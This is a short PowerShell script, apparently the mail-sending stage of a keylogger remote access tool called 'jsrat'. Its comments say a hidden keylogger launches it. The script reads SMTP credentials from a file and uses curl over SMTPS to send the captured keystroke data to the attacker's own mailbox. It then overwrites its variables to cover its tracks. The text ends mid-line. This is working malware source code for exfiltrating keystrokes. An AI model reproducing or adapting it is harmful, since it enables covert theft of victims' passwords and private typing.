# This file sends the email to the server
# This should work with gmail
# It will show a window if it runs standalone. However, when you start it from
# the hidden keylogger it will run ~perfectly~
# Coded by @J-P-S-O (https://github.com/J-P-S-O/jsrat)
#

$file_data = Get-Content pass.txt
$EmailFrom = $file_data[2]
$EmailTo = $file_data[2]
$Subject = Get-Date
$Body = Get-Content record.log
$SMTPServer = $file_data[3]
$mailusername = $file_data[0]
$mailpassword = $file_data[1]
$url = 'smtps://' + $SMTPServer+":"+$file_data[4]
$user = $mailusername+':'+$mailpassword
Write-Output $EmailFrom
Write-Output $EmailTo
Write-Output $mailusername
Write-Output $mailpassword
Write-Output $file_data[4]

curl --ssl-reqd --url $url --user $user --mail-from $mailusername --mail-rcpt $mailusername --upload-file mail.txt

# Remove all the data

$file_data = "whoosh"
$mailusername = "whoosh"
$mailpassword = "whoosh"
$EmailFrom = "whoosh"
$EmailTo = "whoosh"
$Body = "whoosh"
$Subject = "whoosh"
$SMTPServer = "WHOOSH"
$url = "whoosh"
$user =